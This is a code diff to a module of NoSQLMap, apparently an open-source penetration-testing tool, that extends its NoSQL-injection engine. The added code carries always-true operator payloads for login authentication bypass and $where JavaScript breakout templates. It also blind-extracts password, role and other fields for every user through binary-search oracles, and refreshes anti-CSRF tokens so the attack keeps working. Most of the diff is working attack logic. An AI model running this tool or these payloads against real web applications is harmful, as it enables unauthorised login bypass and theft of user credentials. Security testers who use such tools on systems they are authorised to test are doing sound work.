@@ -2,17 +2,16 @@
 # NoSQLMap Copyright 2012-2017 NoSQLMap Development team
 # See the file 'doc/COPYING' for copying permission
 
-# Modern web NoSQL-injection engine.
+# Modern web NoSQL-injection engine (think "sqlmap, for NoSQL").
 #
-# Unlike the legacy getApps/postApps path, this engine:
-#   * injects an operator into ALL credential-like fields at once (the common
-#     login auth-bypass that single-parameter injection structurally misses),
-#   * works over both urlencoded and JSON request bodies,
-#   * decides with a per-target DIFFERENTIAL ORACLE instead of a fixed byte
-#     threshold: it first measures the app's own response noise (two known-false
-#     requests), then flags a payload only when its response diverges from the
-#     baseline beyond that noise across status code, redirect, Set-Cookie,
-#     length and content similarity.
+# Techniques:   boolean operator injection  +  $where JavaScript injection
+# Vectors:      urlencoded form  /  JSON body  /  GET query
+# Oracle:       per-target DIFFERENTIAL with N-sample noise calibration
+#               (status / redirect / Set-Cookie / length / content-similarity)
+# Extraction:   binary-search blind read, string + numeric + boolean types,
+#               arbitrary document fields via $regex (find(req.body)) or
+#               $where this.<field> (works even on strict-key logins)
+# Plumbing:     persistent session + optional anti-CSRF token carried per request
 
 import difflib
 import json as _json
@@ -38,18 +37,52 @@ _CHARSET_ALNUM = string.ascii_lowercase + string.ascii_uppercase + string.digits
 _CHARSET_DEFAULT = _CHARSET_ALNUM + "@._-+ !#$%&*"
 _CHARSET_FULL = _CHARSET_DEFAULT + "?/\\|~^()[]{}<>:;,'\"=`"
 
+# Calibration samples for the noise model.
+_SAMPLES = 4
+
+# Status codes that usually mean "blocked" (WAF/ratelimit), not injection.
+_BLOCKING = {403, 406, 429, 501}
+
+# $where field-value breakout templates.  One %s is filled with a JS boolean
+# expression ("true" for detection, a per-char test for extraction).
+_WHERE_TEMPLATES = [
+    ("sq-inline", "' || (%s) || '"),
+    ("dq-inline", "\" || (%s) || \""),
+    ("sq-fn", "'; return (%s); var _d='"),
+    ("dq-fn", "\"; return (%s); var _d=\""),
+    ("bare", " || (%s) || "),
+]
+
 
 def args():
     return [
-        ["--extract", "Blind-extract these comma-separated document fields via $regex (e.g. email,password,role,isAdmin); fields need not be submitted by the form; multiple fields are pinned to one user"],
+        ["--extract", "Blind-extract these comma-separated document fields (e.g. email,password,role,isAdmin); fields need not be submitted by the form; multiple fields are pinned to one user"],
         ["--extractCharset", "Extraction charset: alnum, default, or full"],
         ["--extractMax", "Max characters to extract per value (default 64)"],
-        ["--extractUsers", "Enumerate ALL users via $nin exclusion, not just the first (y/n)"],
+        ["--extractUsers", "Enumerate ALL users, not just the first (y/n)"],
+        ["--extractMethod", "Extraction backend: auto (default), regex, or where ($where this.field)"],
+        ["--noWhere", "Skip the $where JavaScript technique (y)"],
+        ["--csrfField", "Form field carrying an anti-CSRF token (carried, refreshed, on every request)"],
+        ["--csrfUrl", "URL to GET a fresh CSRF token from (default: the target URL)"],
+        ["--csrfRegex", "Regex with one capture group for the token (default: derived from --csrfField)"],
     ]
 
 
 def _rand(n=8):
     return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))
+
+
+# ---------------------------------------------------------------------------
+# Transport: context (session + CSRF), request builders, probe
+# ---------------------------------------------------------------------------
+
+class Ctx:
+    def __init__(self, headers=None, verify=False, csrf=None, timeout=15, session=None):
+        self.session = session or requests.Session()
+        self.headers = headers
+        self.verify = verify
+        self.csrf = csrf          # {"field","url","regex"} or None
+        self.timeout = timeout
 
 
 class Probe:
@@ -60,6 +93,28 @@ class Probe:
         self.body = resp.text or ""
         self.length = len(self.body)
         self.elapsed = elapsed
+
+
+def _csrf_default_regex(field):
+    f = re.escape(field)
+    return (r'name=["\']?%s["\']?[^>]*?value=["\']([^"\']*)["\']'
+            r'|value=["\']([^"\']*)["\'][^>]*?name=["\']?%s' % (f, f))
+
+
+def _fetch_csrf(ctx):
+    c = ctx.csrf
+    try:
+        r = ctx.session.get(c["url"], headers=ctx.headers, verify=ctx.verify, timeout=ctx.timeout)
+    except requests.RequestException:
+        return None
+    rx = c.get("regex") or _csrf_default_regex(c["field"])
+    m = re.search(rx, r.text)
+    if not m:
+        return None
+    for g in m.groups():
+        if g is not None:
+            return g
+    return None
 
 
 def _formval(v):
@@ -73,12 +128,10 @@ def _formval(v):
 
 
 def _form_ops(out, prefix, d):
-    # Encode an operator dict into PHP-style bracket params, recursing for nested
-    # operators (e.g. field[$not][$regex]) and lists (field[$nin][]).
     for op, v in d.items():
         key = "%s[%s]" % (prefix, op)
         if isinstance(v, dict):
-            _form_ops(out, key, v)
+            _form_ops(out, key, v)            # nested, e.g. field[$not][$regex]
         elif isinstance(v, list):
             out[key + "[]"] = [_formval(x) for x in v]
         else:
@@ -92,7 +145,7 @@ def _build_form(fields):
             out[name] = _formval(spec[1])
         elif spec[0] == "op":
             out["%s[%s]" % (name, spec[1])] = _formval(spec[2])
-        else:  # ("ops", {op: val, ...}) including nested dicts / lists / bools
+        else:  # ("ops", {...}) including nested dicts / lists / bools
             _form_ops(out, name, spec[1])
     return out
 
@@ -104,13 +157,18 @@ def _build_json(fields):
             out[name] = spec[1]
         elif spec[0] == "op":
             out[name] = {spec[1]: spec[2]}
-        else:  # ("ops", {...}) -- nested dicts / lists / bools pass through as JSON
+        else:
             out[name] = dict(spec[1])
     return out
 
 
-def _send(method, url, vector, fields, headers, verify, timeout=15):
-    kw = dict(headers=headers, allow_redirects=False, verify=verify, timeout=timeout)
+def _send(ctx, method, url, vector, fields):
+    fields = dict(fields)
+    if ctx.csrf:
+        token = _fetch_csrf(ctx)
+        if token is not None:
+            fields[ctx.csrf["field"]] = ("lit", token)
+    kw = dict(headers=ctx.headers, allow_redirects=False, verify=ctx.verify, timeout=ctx.timeout)
     if method == "GET":
         kw["params"] = _build_form(fields)
     elif vector == "json":
@@ -118,9 +176,13 @@ def _send(method, url, vector, fields, headers, verify, timeout=15):
     else:
         kw["data"] = _build_form(fields)
     start = time.time()
-    resp = requests.request(method, url, **kw)
+    resp = ctx.session.request(method, url, **kw)
     return Probe(resp, time.time() - start)
 
+
+# ---------------------------------------------------------------------------
+# Oracle
+# ---------------------------------------------------------------------------
 
 def _similarity(a, b):
     if not a and not b:
@@ -128,41 +190,79 @@ def _similarity(a, b):
     return difflib.SequenceMatcher(None, a, b).quick_ratio()
 
 
-# Status codes that usually mean "blocked" (WAF/ratelimit) rather than a
-# genuine injection signal.
-_BLOCKING = {403, 406, 429, 501}
+class Noise:
+    # Calibrated from N known-false responses: captures the app's natural
+    # variance so detection thresholds adapt instead of being hardcoded.
+    def __init__(self, probes):
+        self.probes = probes
+        self.ref = probes[0]
+        lengths = [p.length for p in probes]
+        self.len_mean = sum(lengths) / len(lengths)
+        self.len_spread = max(lengths) - min(lengths)
+        sims = []
+        for i in range(len(probes)):
+            for j in range(i + 1, len(probes)):
+                sims.append(_similarity(probes[i].body, probes[j].body))
+        self.sim_floor = min(sims) if sims else 1.0
+        self.statuses = set(p.status for p in probes)
+        self.has_cookie = any(p.cookies for p in probes)
 
 
-def _signal(true_p, base_p, noise_len, noise_ratio):
-    # Return (reasons, strong).  'strong' is False when the only difference is a
-    # blocking status change, which is more likely a WAF than confirmed injection.
+def _signal(true_p, noise):
     reasons = []
     positive = False
-    if true_p.status != base_p.status:
-        reasons.append("status %s->%s" % (base_p.status, true_p.status))
+    if true_p.status not in noise.statuses:
+        reasons.append("status %s->%s" % (sorted(noise.statuses), true_p.status))
         if true_p.status not in _BLOCKING:
             positive = True
-    if true_p.location and true_p.location != base_p.location:
+    if true_p.location and true_p.location != noise.ref.location:
         reasons.append("redirect->%s" % true_p.location)
         positive = True
-    if true_p.cookies and not base_p.cookies:
+    if true_p.cookies and not noise.has_cookie:
         reasons.append("session cookie set")
         positive = True
-    len_delta = abs(true_p.length - base_p.length)
-    if len_delta > max(noise_len * 3, 40):
-        reasons.append("len %d vs base %d (noise %d)" % (true_p.length, base_p.length, noise_len))
+    len_delta = abs(true_p.length - noise.len_mean)
+    if len_delta > max(noise.len_spread * 3 + 20, 40):
+        reasons.append("len %d vs ~%d (spread %d)" % (true_p.length, noise.len_mean, noise.len_spread))
         positive = True
-    ratio = _similarity(true_p.body, base_p.body)
-    if ratio < min(noise_ratio - 0.10, 0.92):
-        reasons.append("content divergence %.2f (noise %.2f)" % (ratio, noise_ratio))
+    sim = max(_similarity(true_p.body, p.body) for p in noise.probes)
+    if sim < min(noise.sim_floor - 0.07, 0.95):
+        reasons.append("content divergence %.2f (floor %.2f)" % (sim, noise.sim_floor))
         positive = True
     return reasons, positive
 
 
+def _states_differ(a, b):
+    # Boolean oracle viable between a (match) and b (no-match)?
+    if a.status != b.status and a.status not in _BLOCKING:
+        return True
+    if a.location and a.location != b.location:
+        return True
+    if a.cookies and not b.cookies:
+        return True
+    if abs(a.length - b.length) > 40:
+        return True
+    return _similarity(a.body, b.body) < 0.95
+
+
+def _classify_true(probe, true_sig, false_sig):
+    if probe.status == true_sig.status and probe.status != false_sig.status:
+        return True
+    if probe.status == false_sig.status and probe.status != true_sig.status:
+        return False
+    st = _similarity(probe.body, true_sig.body)
+    sf = _similarity(probe.body, false_sig.body)
+    if abs(st - sf) < 0.02:
+        return abs(probe.length - true_sig.length) <= abs(probe.length - false_sig.length)
+    return st > sf
+
+
+# ---------------------------------------------------------------------------
+# Detection candidates
+# ---------------------------------------------------------------------------
+
 def _op_specs():
-    # (label, {op: value})  -- value _RANDV is replaced with a fresh random.
-    # Every payload here is ALWAYS-TRUE: it makes a field clause match any
-    # document, which is what bypasses a login when applied to all fields.
+    # (label, {op: value}) -- every payload is ALWAYS-TRUE (matches any document).
     return [
         ("$ne:<rand>",   {"$ne": _RANDV}),
         ("$ne:null",     {"$ne": None}),
@@ -171,7 +271,7 @@ def _op_specs():
         ("$regex:.*",    {"$regex": ".*"}),
         ("$nin:[rand]",  {"$nin": [_RANDV]}),
         ("$exists:true", {"$exists": True}),
-        ("$not/$regex",  {"$not": {"$regex": "^$"}}),   # non-empty; also $not WAF evasion
+        ("$not/$regex",  {"$not": {"$regex": "^$"}}),
     ]
 
 
@@ -192,61 +292,71 @@ def _resolve_ops(opdict):
 def _candidates(fields_literal):
     names = list(fields_literal.keys())
     cands = []
-    # A) auth-bypass: apply an always-true operator to EVERY field at once.
+    # A) auth-bypass: always-true operator on EVERY field at once.
     for lbl, od in _op_specs():
         spec = {n: ("ops", _resolve_ops(od)) for n in names}
-        cands.append(("all-fields %s" % lbl, spec))
-    # B) single-field: inject one field, keep the rest at their real values
-    #    (covers data endpoints like ?id=5 -> id[$ne]).
+        cands.append(("all-fields %s" % lbl, spec, None))
+    # B) single-field operator (data endpoints like ?id=5 -> id[$ne]).
     if len(names) > 1:
         for f in names:
             for lbl, od in _op_specs():
                 spec = {n: ("lit", fields_literal[n]) for n in names}
                 spec[f] = ("ops", _resolve_ops(od))
-                cands.append(("%s %s" % (f, lbl), spec))
+                cands.append(("%s %s" % (f, lbl), spec, None))
     return cands
 
 
-def detect(base_url, method, fields_literal, headers=None, verify=False):
+def _where_candidates(fields_literal):
+    names = list(fields_literal.keys())
+    cands = []
+    for f in names:
+        for tlabel, tmpl in _WHERE_TEMPLATES:
+            spec = {n: ("lit", fields_literal[n]) for n in names}
+            spec[f] = ("lit", tmpl % "true")
+            cands.append(("$where %s/%s" % (f, tlabel), spec, {"field": f, "template": tmpl}))
+    return cands
+
+
+def detect(base_url, method, fields_literal, headers=None, verify=False,
+           csrf=None, no_where=False, ctx=None):
     method = method.upper()
+    if ctx is None:
+        ctx = Ctx(headers, verify, csrf)
     vectors = ["form"] if method == "GET" else ["form", "json"]
     findings = []
 
     for vector in vectors:
-        def false_probe():
-            f = {n: ("lit", _rand()) for n in fields_literal}
-            return _send(method, base_url, vector, f, headers, verify)
-
-        # Calibrate this target's natural noise with two known-false requests.
         try:
-            base = false_probe()
-            base2 = false_probe()
+            falses = [_send(ctx, method, base_url, vector,
+                            {n: ("lit", _rand()) for n in fields_literal}) for _ in range(_SAMPLES)]
         except requests.RequestException as e:
             print("  [%s] could not reach target: %s" % (vector, e))
             continue
-        noise_len = abs(base.length - base2.length)
-        noise_ratio = _similarity(base.body, base2.body)
+        noise = Noise(falses)
 
-        for label, spec in _candidates(fields_literal):
+        cands = _candidates(fields_literal)
+        if not no_where:
+            cands = cands + _where_candidates(fields_literal)
+
+        for label, spec, meta in cands:
             try:
-                t = _send(method, base_url, vector, spec, headers, verify)
+                t = _send(ctx, method, base_url, vector, spec)
             except requests.RequestException:
                 continue
-            reasons, positive = _signal(t, base, noise_len, noise_ratio)
+            reasons, positive = _signal(t, noise)
             if not reasons:
                 continue
-            # Confirm: re-run once and require the signal again (kills flukes).
             try:
-                t2 = _send(method, base_url, vector, spec, headers, verify)
+                t2 = _send(ctx, method, base_url, vector, spec)
             except requests.RequestException:
                 continue
-            reasons2, positive2 = _signal(t2, base, noise_len, noise_ratio)
+            reasons2, positive2 = _signal(t2, noise)
             if not reasons2:
                 continue
             findings.append({
-                "vector": vector, "label": label, "spec": spec,
-                "reasons": reasons2, "strong": positive and positive2,
-                "status": t.status, "length": t.length, "base_length": base.length,
+                "vector": vector, "label": label, "spec": spec, "reasons": reasons2,
+                "strong": positive and positive2, "status": t.status,
+                "length": t.length, "where": meta,
             })
     return findings
 
@@ -259,13 +369,35 @@ def _payload_repr(spec, method, vector):
 
 
 # ---------------------------------------------------------------------------
-# Phase 3: blind $regex extraction.
-#
-# Once a field is injectable, walk its value character by character: anchor a
-# $regex at "^<known-prefix><guess>" while forcing every other field always-true
-# with $ne:<rand>.  A guess that keeps the query matching (TRUE/match-found
-# response) is the next correct character.
+# Extraction
 # ---------------------------------------------------------------------------
+
+def _char_class(chars):
+    esc = "".join("\\" + c if c in "\\]^-" else c for c in chars)
+    return "[" + esc + "]"
+
+
+def _walk_value(is_true, charset, maxlen, label=""):
+    # Binary-search each character: ~log2(len(charset)) requests per char.
+    value = ""
+    while len(value) < maxlen:
+        if not is_true("^" + re.escape(value) + _char_class(charset)):
+            break
+        chars = list(charset)
+        lo, hi = 0, len(chars)
+        while hi - lo > 1:
+            mid = (lo + hi) // 2
+            if is_true("^" + re.escape(value) + _char_class(chars[lo:mid])):
+                hi = mid
+            else:
+                lo = mid
+        value += chars[lo]
+        if label:
+            print("\r    %s: %s" % (label, value), end="")
+    if label:
+        print("")
+    return value
+
 
 def _regex_ops(pattern, exclude):
     d = {"$regex": pattern}
@@ -274,108 +406,152 @@ def _regex_ops(pattern, exclude):
     return d
 
 
-def _extract_probe(method, url, vector, fields_literal, field, pattern, headers, verify,
-                   exclude=None, pin=None):
-    pin = pin or {}
+def _field_probe(ctx, method, url, vector, fields_literal, field, target_spec, pin, exclude_self=True):
     spec = {}
-    # Submitted fields default to always-true companions.
     for n in fields_literal:
-        spec[n] = ("op", "$ne", _rand())
-    # Pin already-recovered fields (which may include non-submitted ones) so the
-    # whole record stays one user.
-    for n, val in pin.items():
-        if n != field:
+        spec[n] = ("op", "$ne", _rand())          # companions always-true
+    for n, val in (pin or {}).items():
+        if not (exclude_self and n == field):
             spec[n] = ("lit", val)
-    # The field under extraction.  This may be an arbitrary document field the
-    # form never submits (role, isAdmin, apiKey, ...): adding it as its own
-    # operator constraint extracts it when the app queries by the request body
-    # (e.g. Mongoose find(req.body) / find($_POST)).
-    spec[field] = ("ops", _regex_ops(pattern, exclude))
-    return _send(method, url, vector, spec, headers, verify)
+    spec[field] = target_spec
+    return _send(ctx, method, url, vector, spec)
 
 
-def _states_differ(a, b):
-    # Is there a usable boolean oracle between match (a) and no-match (b)?
-    _, strong = _signal(a, b, 0, 1.0)
-    return strong
-
-
-def _classify_true(probe, true_sig, false_sig):
-    if probe.status == true_sig.status and probe.status != false_sig.status:
-        return True
-    if probe.status == false_sig.status and probe.status != true_sig.status:
-        return False
-    st = _similarity(probe.body, true_sig.body)
-    sf = _similarity(probe.body, false_sig.body)
-    if abs(st - sf) < 0.02:
-        return abs(probe.length - true_sig.length) <= abs(probe.length - false_sig.length)
-    return st > sf
-
-
-def extract(base_url, method, vector, fields_literal, field, headers=None, verify=False,
-            charset=None, maxlen=64, exclude=None, pin=None):
-    method = method.upper()
-    charset = charset or _CHARSET_DEFAULT
-    # TRUE/FALSE references with the SAME query shape, only the regex differs,
-    # so the regex match is the only variable.
+def _regex_is_true(ctx, method, base_url, vector, fields_literal, field, pin, exclude):
+    def probe(pattern):
+        return _field_probe(ctx, method, base_url, vector, fields_literal, field,
+                            ("ops", _regex_ops(pattern, exclude)), pin)
     try:
-        true_sig = _extract_probe(method, base_url, vector, fields_literal, field, ".*", headers, verify, exclude, pin)
-        false_sig = _extract_probe(method, base_url, vector, fields_literal, field, "^" + _rand(16) + "$", headers, verify, exclude, pin)
-    except requests.RequestException as e:
-        print("    extraction error: %s" % e)
+        true_sig = probe(".*")
+        false_sig = probe("^" + _rand(16) + "$")
+    except requests.RequestException:
         return None
     if not _states_differ(true_sig, false_sig):
         return None
 
-    value = ""
-    while len(value) < maxlen:
-        nxt = None
-        for c in charset:
-            pat = "^" + re.escape(value + c)
-            try:
-                p = _extract_probe(method, base_url, vector, fields_literal, field, pat, headers, verify, exclude, pin)
-            except requests.RequestException:
-                continue
-            if _classify_true(p, true_sig, false_sig):
-                nxt = c
-                value += c
-                print("\r    %s: %s" % (field, value), end="")
-                break
-        if nxt is None:
-            break
-    print("")
-    return value
+    def is_true(pattern):
+        try:
+            return _classify_true(probe(pattern), true_sig, false_sig)
+        except requests.RequestException:
+            return False
+    return is_true
+
+
+def _extract_typed(ctx, method, base_url, vector, fields_literal, field, pin, exclude):
+    # Non-string fields: numeric (bisection) and boolean.
+    def probe(target_spec):
+        return _field_probe(ctx, method, base_url, vector, fields_literal, field, target_spec, pin)
+    try:
+        ref_true = probe(("ops", {"$exists": True}))
+        ref_false = probe(("lit", _rand(16)))
+    except requests.RequestException:
+        return None
+    if not _states_differ(ref_true, ref_false):
+        return None
+
+    def gte(n):
+        try:
+            return _classify_true(probe(("ops", {"$gte": n})), ref_true, ref_false)
+        except requests.RequestException:
+            return False
+
+    LO, HI = -(1 << 52), (1 << 52)
+    if gte(LO) and not gte(HI):          # looks numeric
+        lo, hi = LO, HI
+        while hi - lo > 1:
+            mid = (lo + hi) // 2
+            if gte(mid):
+                lo = mid
+            else:
+                hi = mid
+        return lo                        # largest n with field>=n -> the value
+
+    for bval in (True, False):           # boolean
+        try:
+            if _classify_true(probe(("lit", bval)), ref_true, ref_false):
+                return bval
+        except requests.RequestException:
+            pass
+    return None
+
+
+def _where_is_true(ctx, method, base_url, vector, fields_literal, inj_field, template, target):
+    def probe(testexpr):
+        spec = {n: ("lit", fields_literal[n]) for n in fields_literal}
+        spec[inj_field] = ("lit", template % testexpr)
+        return _send(ctx, method, base_url, vector, spec)
+    try:
+        true_sig = probe("true")
+        false_sig = probe("false")
+    except requests.RequestException:
+        return None
+    if not _states_differ(true_sig, false_sig):
+        return None
+
+    def is_true(pattern):
+        js_pat = pattern.replace("/", "\\/")
+        js = "this.%s!=null && /%s/.test(String(this.%s))" % (target, js_pat, target)
+        try:
+            return _classify_true(probe(js), true_sig, false_sig)
+        except requests.RequestException:
+            return False
+    return is_true
+
+
+def extract(base_url, method, vector, fields_literal, field, headers=None, verify=False,
+            charset=None, maxlen=64, exclude=None, pin=None, ctx=None, where=None,
+            ext_method="auto"):
+    if ctx is None:
+        ctx = Ctx(headers, verify)
+    charset = charset or _CHARSET_DEFAULT
+
+    if ext_method in ("auto", "regex"):
+        is_true = _regex_is_true(ctx, method, base_url, vector, fields_literal, field, pin, exclude)
+        if is_true:
+            return _walk_value(is_true, charset, maxlen, label=field)
+        typed = _extract_typed(ctx, method, base_url, vector, fields_literal, field, pin, exclude)
+        if typed is not None:
+            print("    %s = %s (typed)" % (field, typed))
+            return str(typed)
+
+    if where and ext_method in ("auto", "where"):
+        wis = _where_is_true(ctx, method, base_url, vector, fields_literal,
+                             where["field"], where["template"], field)
+        if wis:
+            return _walk_value(wis, charset, maxlen, label=field)
+    return None
 
 
 def extract_record(base_url, method, vector, fields_literal, field_list, headers=None,
-                   verify=False, charset=None, maxlen=64, exclude_first=None):
-    # Extract each field in order, pinning the ones already recovered so the whole
-    # record belongs to ONE user.  exclude_first applies $nin on the first field
-    # (used to skip users already enumerated).
+                   verify=False, charset=None, maxlen=64, exclude_first=None,
+                   ctx=None, where=None, ext_method="auto"):
+    if ctx is None:
+        ctx = Ctx(headers, verify)
     record = {}
     pin = {}
     for i, f in enumerate(field_list):
-        v = extract(base_url, method, vector, fields_literal, f, headers, verify,
-                    charset, maxlen, exclude=(exclude_first if i == 0 else None), pin=dict(pin))
+        v = extract(base_url, method, vector, fields_literal, f, charset=charset, maxlen=maxlen,
+                    exclude=(exclude_first if i == 0 else None), pin=dict(pin),
+                    ctx=ctx, where=where, ext_method=ext_method)
         record[f] = v
         if i == 0 and v is None:
-            break                      # no (more) matching users -> stop this record
+            break
         if v is not None:
             pin[f] = v
     return record
 
 
 def extract_records(base_url, method, vector, fields_literal, field_list, headers=None,
-                    verify=False, charset=None, maxlen=64):
-    # Enumerate every distinct user: walk the first field with $nin, and for each
-    # value pin it and recover the remaining fields.
+                    verify=False, charset=None, maxlen=64, ctx=None, where=None, ext_method="auto"):
+    if ctx is None:
+        ctx = Ctx(headers, verify)
     records = []
     seen = []
     while True:
         rec = extract_record(base_url, method, vector, fields_literal, field_list,
-                             headers, verify, charset, maxlen, exclude_first=list(seen))
-        first = field_list[0]
-        v0 = rec.get(first)
+                             charset=charset, maxlen=maxlen, exclude_first=list(seen),
+                             ctx=ctx, where=where, ext_method=ext_method)
+        v0 = rec.get(field_list[0])
         if not v0 or v0 in seen:
             break
         seen.append(v0)
@@ -386,11 +562,13 @@ def extract_records(base_url, method, vector, fields_literal, field_list, header
 
 
 def extract_users(base_url, method, vector, fields_literal, field, headers=None, verify=False,
-                  charset=None, maxlen=64):
+                  charset=None, maxlen=64, ctx=None, where=None, ext_method="auto"):
+    if ctx is None:
+        ctx = Ctx(headers, verify)
     found = []
     while True:
-        v = extract(base_url, method, vector, fields_literal, field, headers, verify,
-                    charset, maxlen, exclude=found)
+        v = extract(base_url, method, vector, fields_literal, field, charset=charset, maxlen=maxlen,
+                    exclude=found, ctx=ctx, where=where, ext_method=ext_method)
         if not v or v in found:
             break
         found.append(v)
@@ -398,7 +576,7 @@ def extract_users(base_url, method, vector, fields_literal, field, headers=None,
     return found
 
 
-def _maybe_extract(strong, base_url, method, fields_literal, headers, verify, args):
+def _maybe_extract(strong, findings, base_url, method, fields_literal, ctx, args, ext_method):
     if not strong:
         return
     raw = None
@@ -418,9 +596,9 @@ def _maybe_extract(strong, base_url, method, fields_literal, headers, verify, ar
             maxlen = 64
         multi = str(getattr(args, "extractUsers", "") or "").lower() == "y"
     else:
-        if input("\nBlind-extract field value(s) via $regex? (y/n) ").lower() != "y":
+        if input("\nBlind-extract field value(s)? (y/n) ").lower() != "y":
             return
-        raw = input("Field(s) to extract, comma-separated (e.g. email,password): ").strip()
+        raw = input("Field(s), comma-separated (e.g. email,password,role): ").strip()
         multi = input("Enumerate ALL users, not just the first? (y/n) ").lower() == "y"
 
     field_list = [f.strip() for f in raw.split(",") if f.strip()]
@@ -429,41 +607,67 @@ def _maybe_extract(strong, base_url, method, fields_literal, headers, verify, ar
         return
     extra = [f for f in field_list if f not in fields_literal]
     if extra:
-        print("Note: %s not submitted by the form; trying as extra document field(s) "
-              "(works when the app queries by the request body)." % ", ".join(extra))
+        print("Note: %s not submitted by the form; will try via find(req.body) and $where this.field."
+              % ", ".join(extra))
 
     vector = strong[0]["vector"]
-    print("\n[*] Blind-extracting %s via %s vector (charset=%d, max=%d)..."
-          % (field_list, vector, len(charset), maxlen))
+    where = next((f["where"] for f in findings if f.get("where")), None)
+    if ext_method == "regex":
+        where = None
+    if ext_method == "where" and not where:
+        print("No $where injection confirmed; cannot force --extractMethod where.")
+        return
+
+    print("\n[*] Extracting %s via %s vector (method=%s, charset=%d, max=%d)..."
+          % (field_list, vector, ext_method, len(charset), maxlen))
 
     if multi:
         if len(field_list) == 1:
-            vals = extract_users(base_url, method, vector, fields_literal, field_list[0], headers, verify, charset, maxlen)
+            vals = extract_users(base_url, method, vector, fields_literal, field_list[0],
+                                 charset=charset, maxlen=maxlen, ctx=ctx, where=where, ext_method=ext_method)
             print("[+] Recovered %d value(s): %s" % (len(vals), ", ".join(vals) if vals else "(none)"))
         else:
-            recs = extract_records(base_url, method, vector, fields_literal, field_list, headers, verify, charset, maxlen)
+            recs = extract_records(base_url, method, vector, fields_literal, field_list,
+                                   charset=charset, maxlen=maxlen, ctx=ctx, where=where, ext_method=ext_method)
             print("[+] Recovered %d record(s):" % len(recs))
             for r in recs:
                 print("    " + ", ".join("%s=%s" % (k, r.get(k)) for k in field_list))
     else:
         if len(field_list) == 1:
-            v = extract(base_url, method, vector, fields_literal, field_list[0], headers, verify, charset, maxlen)
-            if v:
-                print("[+] %s = %s" % (field_list[0], v))
-            else:
-                print("[-] Could not establish a usable boolean oracle for extraction.")
+            v = extract(base_url, method, vector, fields_literal, field_list[0],
+                        charset=charset, maxlen=maxlen, ctx=ctx, where=where, ext_method=ext_method)
+            print("[+] %s = %s" % (field_list[0], v) if v is not None
+                  else "[-] Could not establish an extraction oracle for '%s'." % field_list[0])
         else:
-            rec = extract_record(base_url, method, vector, fields_literal, field_list, headers, verify, charset, maxlen)
+            rec = extract_record(base_url, method, vector, fields_literal, field_list,
+                                 charset=charset, maxlen=maxlen, ctx=ctx, where=where, ext_method=ext_method)
             print("[+] Recovered record (one user):")
             for k in field_list:
                 print("    %s = %s" % (k, rec.get(k)))
 
 
 def run(base_url, method, fields_literal, headers=None, verify=False, args=None):
-    print("Modern NoSQL Web Injection (differential oracle)")
-    print("================================================")
+    fields_literal = dict(fields_literal)
+    csrf = None
+    no_where = False
+    ext_method = "auto"
+    if args is not None:
+        cf = getattr(args, "csrfField", None)
+        if cf:
+            csrf = {"field": cf, "url": getattr(args, "csrfUrl", None) or base_url,
+                    "regex": getattr(args, "csrfRegex", None)}
+        no_where = str(getattr(args, "noWhere", "") or "").lower() == "y"
+        ext_method = (getattr(args, "extractMethod", None) or "auto").lower()
+
+    if csrf:
+        fields_literal.pop(csrf["field"], None)
+
+    print("Modern NoSQL Web Injection (boolean + $where, differential oracle)")
+    print("=================================================================")
     print("Target: %s [%s]" % (base_url, method.upper()))
     print("Fields: %s" % (", ".join(fields_literal.keys()) or "(none)"))
+    if csrf:
+        print("CSRF  : carrying '%s' from %s on every request" % (csrf["field"], csrf["url"]))
     print("")
 
     if not fields_literal:
@@ -472,7 +676,8 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None)
             input("\nPress enter to continue...")
         return []
 
-    findings = detect(base_url, method, fields_literal, headers, verify)
+    ctx = Ctx(headers, verify, csrf)
+    findings = detect(base_url, method, fields_literal, no_where=no_where, ctx=ctx)
 
     print("")
     strong = [f for f in findings if f["strong"]]
@@ -495,18 +700,19 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None)
 
             ab = [f for f in strong if f["label"].startswith("all-fields")]
             if ab:
-                print("")
-                print("[!] AUTHENTICATION BYPASS: every field accepts a simultaneous")
+                print("\n[!] AUTHENTICATION BYPASS: every field accepts a simultaneous")
                 print("    operator injection.  Reproduce with:")
                 print("    %s" % _payload_repr(ab[0]["spec"], method, ab[0]["vector"]))
+            if any(f["label"].startswith("$where") for f in strong):
+                print("\n[!] $where JAVASCRIPT injection confirmed: arbitrary fields are")
+                print("    extractable via this.<field> (even fields the form never submits).")
 
         if weak:
-            print("")
-            print("=== POSSIBLE (status-only change, may be a WAF) ===")
+            print("\n=== POSSIBLE (status-only change, may be a WAF) ===")
             for f in weak:
                 print("[?] %s (%s): %s" % (f["label"], f["vector"], "; ".join(f["reasons"])))
 
-    _maybe_extract(strong, base_url, method, fields_literal, headers, verify, args)
+    _maybe_extract(strong, findings, base_url, method, fields_literal, ctx, args, ext_method)
 
     if args is None:
         input("\nPress enter to continue...")
